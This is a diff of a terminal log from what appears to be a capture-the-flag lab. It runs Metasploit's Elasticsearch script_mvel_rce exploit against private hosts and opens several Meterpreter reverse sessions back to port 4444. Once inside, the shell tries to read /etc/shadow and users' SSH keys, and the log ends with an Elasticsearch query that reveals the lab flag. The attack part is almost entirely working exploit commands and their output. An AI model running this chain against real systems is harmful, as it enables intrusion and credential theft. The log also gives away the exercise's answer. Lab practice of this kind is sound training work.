@@ -6,8 +6,16 @@ spawn msfconsole -q -x use exploit/multi/elasticsearch/script_mvel_rce; set rhos
 [1m[34m[*][0m Discovering remote OS...
 [1m[32m[+][0m Remote OS is 'Linux'
 [1m[34m[*][0m Sending stage (58829 bytes) to 192.168.52.60
-[0m[1m[32m[+][0m Deleted /tmp/qdADVg.jar
-[1m[34m[*][0m Meterpreter session 1 opened (192.168.53.28:4444 -> 192.168.52.60:40960) at 2023-06-07 17:28:55 +0200
+[1m[34m[*][0m Sending stage (58829 bytes) to 192.168.52.23
+[0m[0m[1m[34m[*][0m Meterpreter session 2 opened (192.168.53.28:4444 -> 192.168.52.23:52994) at 2023-06-13 13:04:49 +0200
+[1m[32m[+][0m Deleted /tmp/DYnZr.jar
+[1m[34m[*][0m Sending stage (58829 bytes) to 192.168.52.60
+[1m[34m[*][0m Sending stage (58829 bytes) to 192.168.52.60
+[1m[34m[*][0m Sending stage (58829 bytes) to 192.168.52.60
+[0m[0m[1m[34m[*][0m Meterpreter session 1 opened (192.168.53.28:4444 -> 192.168.52.60:40332) at 2023-06-13 13:04:49 +0200
+[0m[1m[34m[*][0m Meterpreter session 3 opened (192.168.53.28:4444 -> 192.168.52.60:40342) at 2023-06-13 13:04:49 +0200
+[1m[34m[*][0m Meterpreter session 4 opened (192.168.53.28:4444 -> 192.168.52.60:40346) at 2023-06-13 13:04:50 +0200
+[1m[34m[*][0m Meterpreter session 5 opened (192.168.53.28:4444 -> 192.168.52.60:40360) at 2023-06-13 13:04:50 +0200
 
 [0m[?1034h[4mmeterpreter[0m > shell
 [0mProcess 1 created.
@@ -82,9 +90,15 @@ cat: /etc/shadow: Permission denied
 sudo cat /home/*/.ssh/id_rsa.pub
 cat: '/home/*/.ssh/id_rsa.pub': No such file or directory
 exit
+[1m[31m[-][0m core_channel_interact: Operation failed: 1
 [4mmeterpreter[0m > exit
 [0m[1m[34m[*][0m Shutting down Meterpreter...
 
-[1m[34m[*][0m 192.168.52.60 - Meterpreter session 1 closed.  Reason: Died
+[1m[34m[*][0m 192.168.52.60 - Meterpreter session 5 closed.  Reason: User exit
 [4mmsf6[0m exploit([1m[31mmulti/elasticsearch/script_mvel_rce[0m) [0m> exit -y
-[0m
+[0mkeys:
+flag
+pokedex
+firefox 192.168.52.60:9200/$keys/_search
+{"took":1,"timed_out":false,"_shards":{"total":5,"successful":5,"failed":0},"hits":{"total":1,"max_score":1.0,"hits":[{"_index":"flag","_type":"the","_id":"flag","_score":1.0, "_source" : {"name": "Your flag", "FLAG": "Electabuzz"}}]}}
+{"took":2,"timed_out":false,"_shards":{"total":5,"successful":5,"failed":0},"hits":{"total":151,"max_score":1.0,"hits":[{"_index":"pokedex","_type":"pokemon","_id":"5","_score":1.0, "_source" : {"id": 5, "name": "charmeleon", "weight": 190, "height": 11}},{"_index":"pokedex","_type":"pokemon","_id":"12","_score":1.0, "_source" : {"id": 12, "name": "butterfree", "weight": 320, "height": 11}},{"_index":"pokedex","_type":"pokemon","_id":"17","_score":1.0, "_source" : {"id": 17, "name": "pidgeotto", "weight": 300, "height": 11}},{"_index":"pokedex","_type":"pokemon","_id":"24","_score":1.0, "_source" : {"id": 24, "name": "arbok", "weight": 650, "height": 35}},{"_index":"pokedex","_type":"pokemon","_id":"29","_score":1.0, "_source" : {"id": 29, "name": "nidoran-f", "weight": 70, "height": 4}},{"_index":"pokedex","_type":"pokemon","_id":"31","_score":1.0, "_source" : {"id": 31, "name": "nidoqueen", "weight": 600, "height": 13}},{"_index":"pokedex","_type":"pokemon","_id":"36","_score":1.0, "_source" : {"id": 36, "name": "clefable", "weight": 400, "height": 13}},{"_index":"pokedex","_type":"pokemon","_id":"43","_score":1.0, "_source" : {"id": 43, "name": "oddish", "weight": 54, "height": 5}},{"_index":"pokedex","_type":"pokemon","_id":"48","_score":1.0, "_source" : {"id": 48, "name": "venonat", "weight": 300, "height": 10}},{"_index":"pokedex","_type":"pokemon","_id":"50","_score":1.0, "_source" : {"id": 50, "name": "diglett", "weight": 8, "height": 2}}]}}
